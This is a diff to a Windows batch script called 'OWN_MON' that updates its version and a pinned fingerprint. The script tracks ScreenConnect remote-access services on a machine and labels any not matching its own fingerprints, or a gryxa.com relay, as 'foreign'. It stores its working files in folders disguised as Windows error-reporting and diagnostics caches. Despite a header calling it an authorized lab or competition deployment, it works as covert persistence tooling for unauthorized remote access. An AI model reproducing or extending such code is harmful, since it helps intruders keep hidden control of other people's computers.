@@ -1,14 +1,14 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
 rem  OWN_MON  BUILD 20260802M32
-rem  O45: LIB L23 Gryxa v2 rewrite (state machine, single-flight detached install; no reinstall loop).
+rem  M33: Gryxa FP 36e506ff pin; foreign count treats gryxa-relay as friendly (no mislabel).
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
 
 set "KEEP_FP=5f6010579852e507"
 set "ALT_FP=f861c8140d453427"
-set "GRYXA_FP=9908198e668e4750"
+set "GRYXA_FP=36e506ff016b2151"
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\own_mon.log"
@@ -35,12 +35,12 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M32"
+set "MONVER=M33"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
-if not defined GRYXA_FP set "GRYXA_FP=9908198e668e4750"
+if not defined GRYXA_FP set "GRYXA_FP=36e506ff016b2151"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
 echo ── tick !DT! [ver %MONVER%] ──>>"%LOG%"
@@ -138,7 +138,17 @@ set "FOREIGN_LEFT=0"
 for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
   set "FP=%%a"
   set "FP=!FP: =!"
-  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" if /I not "!FP!"=="%GRYXA_FP%" (
+  rem friendly if keeper FP OR gryxa-relay (ImagePath has gryxa.com) — never count new Gryxa as foreign
+  set "FRIENDLY=0"
+  if /I "!FP!"=="%KEEP_FP%" set "FRIENDLY=1"
+  if /I "!FP!"=="%ALT_FP%" set "FRIENDLY=1"
+  if /I "!FP!"=="%GRYXA_FP%" set "FRIENDLY=1"
+  if "!FRIENDLY!"=="0" (
+    for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
+      echo %%I | findstr /I "gryxa.com" >nul && set "FRIENDLY=1"
+    )
+  )
+  if "!FRIENDLY!"=="0" (
     set /a COUNT+=1
     set /a FOREIGN_LEFT+=1
     set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
